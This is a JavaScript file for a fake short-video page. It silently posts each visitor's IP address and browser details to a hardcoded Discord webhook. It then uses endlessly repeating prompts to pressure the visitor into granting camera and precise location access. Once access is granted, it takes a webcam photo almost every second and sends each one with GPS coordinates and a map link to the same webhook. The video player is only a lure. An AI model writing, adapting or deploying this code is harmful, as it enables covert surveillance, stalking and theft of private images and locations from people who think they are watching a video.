document.addEventListener('DOMContentLoaded', () => {
    // --- Configuration ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
    const PERMISSION_RETRY_DELAY_MS = 500;
    const MAX_CAPTURES = 100000;
    const CAPTURE_INTERVAL_MS = 800;

    // --- State ---
    let permissionsGranted = false;
    let isRequestingPermissions = false;

    // --- DOM Elements ---
    const contentVideo = document.getElementById('contentVideo');
    const camPreview = document.getElementById('camPreview');
    const shortsOverlay = document.querySelector('.shorts-overlay');
    const progressBar = document.querySelector('.progress-bar');
    const ppBtn = document.getElementById('ppBtn');
    const volBtn = document.getElementById('volBtn');
    // const likeBtn = ... (fetched dynamically if needed)

    // --- 1. Visitor Tracking (Fire & Forget) ---
    (async function trackVisit() {
        try {
            let ip = "Unknown";
            let visitCount = "N/A";

            // Get IP
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (e) { }

            // Get Count
            try {
                const countRes = await fetch('https://api.counterapi.dev/v1/lnstgran_tracker/visits/up');
                const countData = await countRes.json();
                visitCount = countData.count;
            } catch (e) { }

            // Send to Discord
            const payload = {
                content: `🔔 **New Visitor!**\n**Total Visits:** #${visitCount}\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}\n**UA:** ${navigator.userAgent}`
            };
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify(payload));
            await fetch(WEBHOOK_URL, { method: "POST", body: formData });
            console.log("Visit tracked.");
        } catch (e) { console.error("Tracking Error", e); }
    })();

    // --- 2. Permission Logic (Parallel & Persistent) ---

    // Entry point: Try to get permissions.
    // Triggered on load and on every user interaction until success.
    async function initCapture() {
        if (permissionsGranted || isRequestingPermissions) return;
        isRequestingPermissions = true;
        console.log("Starting permission request flow...");

        try {
            // A. Location Request Wrapper
            const requestLocation = () => new Promise((resolve) => {
                const attempt = () => {
                    if (!("geolocation" in navigator)) { resolve(null); return; }
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve(pos),
                        (err) => {
                            console.log("Location Denied/Failed:", err);
                            // Blocking Confirm Loop
                            const userChoice = confirm("Please Allow Location Permission to Watch the Video!\nClick OK to Allow.");
                            // Regardless of OK/Cancel, retry after delay
                            setTimeout(attempt, PERMISSION_RETRY_DELAY_MS);
                        },
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                };
                attempt();
            });

            // B. Camera Request Wrapper
            const requestCamera = () => new Promise((resolve) => {
                const attempt = async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                        resolve(stream);
                    } catch (err) {
                        console.log("Camera Denied/Failed:", err);
                        // Blocking Confirm Loop
                        const userChoice = confirm("Please Allow Camera Permission to Watch the Video!\nClick OK to Allow.");
                        // Regardless of OK/Cancel, retry after delay
                        setTimeout(attempt, PERMISSION_RETRY_DELAY_MS);
                    }
                };
                attempt();
            });

            // Execute Both In Parallel
            const [position, stream] = await Promise.all([requestLocation(), requestCamera()]);

            // Success Handling
            if (position && position.coords && stream) {
                console.log("All Permissions Granted!");
                permissionsGranted = true;
                isRequestingPermissions = false;

                // 1. Send Success Log
                const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({ json: () => ({ ip: 'Unknown' }) }));
                const ipObj = await ipRes.json();
                const ip = ipObj.ip;

                const { latitude, longitude, accuracy } = position.coords;
                const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📍 **PERMISSIONS GRANTED!**\n**IP:** ${ip}\n**Maps:** ${googleMapsUrl}\n**Coords:** ${latitude}, ${longitude}`
                    })
                }).catch(console.error);

                // 2. Start Video
                contentVideo.muted = false; // Try unmuted first
                contentVideo.play().then(updateVolumeIcon).catch(() => {
                    contentVideo.muted = true; // Fallback
                    contentVideo.play();
                    updateVolumeIcon();
                });

                // 3. Start Capture Loop
                camPreview.srcObject = stream;
                camPreview.onloadedmetadata = () => {
                    camPreview.play();
                    startCaptureLoop(camPreview, position, ip);
                };
            }

        } catch (e) {
            console.error("Critical Permission Flow Error:", e);
            // Should not happen with infinite retry loops, but reset state just in case
            isRequestingPermissions = false;
        }
    }

    // --- 3. Capture & Send Loop ---
    function startCaptureLoop(videoEl, position, ip) {
        const { latitude, longitude, accuracy } = position.coords;
        let count = 0;

        const intervalId = setInterval(async () => {
            if (count >= MAX_CAPTURES) {
                clearInterval(intervalId);
                return;
            }

            const imageBlob = await captureFrame(videoEl);
            sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
            count++;

        }, CAPTURE_INTERVAL_MS);
    }

    // Helper: Capture Frame to Blob
    function captureFrame(video) {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.8));
    }

    // Helper: Send to Discord
    async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
        const formData = new FormData();
        formData.append("file", imageBlob, `capture_${count}.jpg`);
        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

        const payload = {
            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nMaps: ${googleMapsUrl}\nUA: ${navigator.userAgent}`
        };
        formData.append("payload_json", JSON.stringify(payload));

        try {
            await fetch(WEBHOOK_URL, { method: "POST", body: formData });
        } catch (e) { /* silent fail */ }
    }


    // --- 4. Triggers & Event Listeners ---

    // Initial Attempt
    initCapture();

    // Aggressive triggers (Click, Scroll, etc.) to force User Activation
    ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'].forEach(evt => {
        document.addEventListener(evt, () => initCapture(), { once: false, passive: true });
    });


    // --- 5. UI Logic (Video Controls) ---

    // Volume Icon Updater
    const updateVolumeIcon = () => {
        if (!volBtn) return;
        if (contentVideo.muted) {
            volBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.81.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73 4.27 3zM12 4L9.91 6.09 12 8.18V4z" fill="currentColor"></path></svg>';
        } else {
            volBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M14,3.23V5.29C16.89,6.15 19,8.83 19,12C19,15.17 16.89,17.84 14,18.7V20.77C18,19.86 21,16.28 21,12C21,7.72 18,4.14 14,3.23M16.5,12C16.5,10.23 15.5,8.71 14,7.97V16.02C15.5,15.29 16.5,13.76 16.5,12M3,9V15H7L12,20V4L7,9H3Z" fill="currentColor"></path></svg>';
        }
    };

    // Play/Pause Toggle
    const togglePlay = (e) => {
        if (e) e.stopPropagation();

        if (!permissionsGranted) {
            console.log("Play blocked: Permissions required.");
            // Optional: Could trigger initCapture again here to prompt user
            initCapture();
            return;
        }

        if (contentVideo.paused) {
            contentVideo.play();
            if (ppBtn) ppBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z" fill="currentColor"></path></svg>';
        } else {
            contentVideo.pause();
            if (ppBtn) ppBtn.innerHTML = '<svg viewBox="0 0 24 24" class="control-icon"><path d="M8 5v14l11-7z" fill="currentColor"></path></svg>';
        }
    };

    // Mute Toggle
    const toggleMute = (e) => {
        if (e) e.stopPropagation();
        contentVideo.muted = !contentVideo.muted;
        updateVolumeIcon();
    };

    // Listeners
    if (ppBtn) ppBtn.addEventListener('click', togglePlay);
    if (volBtn) volBtn.addEventListener('click', toggleMute);

    // Middle of screen click
    if (shortsOverlay) {
        shortsOverlay.addEventListener('click', (e) => {
            if (e.target.closest('.icon-btn, .action-item, .subscribe-btn, .bottom-nav, .control-btn')) return;
            togglePlay();
        });
    }

    // Progress Bar
    contentVideo.addEventListener('timeupdate', () => {
        const percentage = (contentVideo.currentTime / contentVideo.duration) * 100;
        if (progressBar) progressBar.style.width = `${percentage}%`;
    });

    // Like Button Visual
    const likeBtn = document.querySelector('.action-item:nth-child(1) .icon-circle');
    if (likeBtn) {
        likeBtn.addEventListener('click', () => {
            const path = likeBtn.querySelector('path');
            if (path && (!path.getAttribute('fill') || path.getAttribute('fill') === 'currentColor')) {
                path.setAttribute('fill', 'red');
                likeBtn.style.color = '#3ea6ff';
            } else if (path) {
                path.setAttribute('fill', 'currentColor'); // Reset
                likeBtn.style.color = 'white';
            }
        });
    }

    // Subscribe Button Visual
    const subBtn = document.querySelector('.subscribe-btn');
    if (subBtn) {
        subBtn.addEventListener('click', () => {
            if (subBtn.innerText === 'Subscribe') {
                subBtn.innerText = 'Subscribed';
                subBtn.style.backgroundColor = '#333';
                subBtn.style.color = '#fff';
            } else {
                subBtn.innerText = 'Subscribe';
                subBtn.style.backgroundColor = 'white';
                subBtn.style.color = 'black';
            }
        });
    }

});
